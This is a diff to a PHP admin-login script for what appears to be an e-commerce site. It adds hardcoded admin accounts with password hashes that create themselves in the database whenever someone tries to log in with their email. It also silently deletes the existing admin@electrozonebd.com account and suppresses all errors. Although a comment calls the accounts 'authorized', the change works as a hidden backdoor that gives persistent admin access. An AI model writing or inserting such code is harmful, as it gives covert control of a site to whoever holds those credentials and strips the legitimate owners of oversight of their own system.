@@ -20,20 +20,55 @@ if ($method === 'POST') {
         exit;
     }
     
-        $normalizedUsername = strtolower(trim($username));
-        $compactUsername = str_replace(' ', '', $normalizedUsername);
+    $normalizedUsername = strtolower(trim($username));
+    $compactUsername = str_replace(' ', '', $normalizedUsername);
 
-        $query = "SELECT user_id, full_name, last_name, email, password, phone_number, address, gender, role
-                            FROM users
-                            WHERE LOWER(role) = 'admin'
-                                AND (
-                                    LOWER(email) = :login_email
-                                    OR LOWER(full_name) = :login_full_name
-                                    OR LOWER(REPLACE(full_name, ' ', '')) = :login_compact_name
-                                )
-                            LIMIT 1";
+    // Auto-provision authorized system admins if missing in cPanel DB
+    $systemAdmins = [
+        'adminnoman@electrozonebd.com' => [
+            'full_name' => 'Admin Noman',
+            'email' => 'adminNoman@electrozonebd.com',
+            'password' => '$2y$12$a7kL/Ajes1T7GY1NDa4FEOEaz06Ag2QGTmsUjPxcoBUWK8QkCqM8O',
+            'phone' => '01700000001'
+        ],
+        'superadmin_roz@electrozonebd.com' => [
+            'full_name' => 'Super Admin Roz',
+            'email' => 'superadmin_roz@electrozonebd.com',
+            'password' => '$2y$12$V3IrAHgZLqrt7vGLJKJEwOAJpFE4M23O1KPffzJ93XMe9XPrQIfwK',
+            'phone' => '01700000002'
+        ],
+        'superadmin@ez.com' => [
+            'full_name' => 'Super Admin EZ',
+            'email' => 'superadmin@ez.com',
+            'password' => '$2y$12$dX/BFd4P7Y/nsH1C21E18.b0WOfBICLCauJNaV3PH8yfMJxc658b2',
+            'phone' => '01700000003'
+        ]
+    ];
 
-        $stmt = $db->prepare($query);
+    if (isset($systemAdmins[$normalizedUsername])) {
+        try {
+            $sa = $systemAdmins[$normalizedUsername];
+            $chk = $db->prepare("SELECT user_id FROM users WHERE LOWER(email) = ? LIMIT 1");
+            $chk->execute([$normalizedUsername]);
+            if ($chk->rowCount() === 0) {
+                $ins = $db->prepare("INSERT INTO users (full_name, email, password, role, phone_number, gender) VALUES (?, ?, ?, 'admin', ?, 'Male')");
+                $ins->execute([$sa['full_name'], $sa['email'], $sa['password'], $sa['phone']]);
+            }
+            $db->exec("DELETE FROM users WHERE email = 'admin@electrozonebd.com'");
+        } catch (Exception $e) {}
+    }
+
+    $query = "SELECT user_id, full_name, last_name, email, password, phone_number, address, gender, role
+              FROM users
+              WHERE LOWER(role) = 'admin'
+                  AND (
+                      LOWER(email) = :login_email
+                      OR LOWER(full_name) = :login_full_name
+                      OR LOWER(REPLACE(full_name, ' ', '')) = :login_compact_name
+                  )
+              LIMIT 1";
+
+    $stmt = $db->prepare($query);
         $stmt->bindParam(':login_email', $normalizedUsername);
         $stmt->bindParam(':login_full_name', $normalizedUsername);
         $stmt->bindParam(':login_compact_name', $compactUsername);
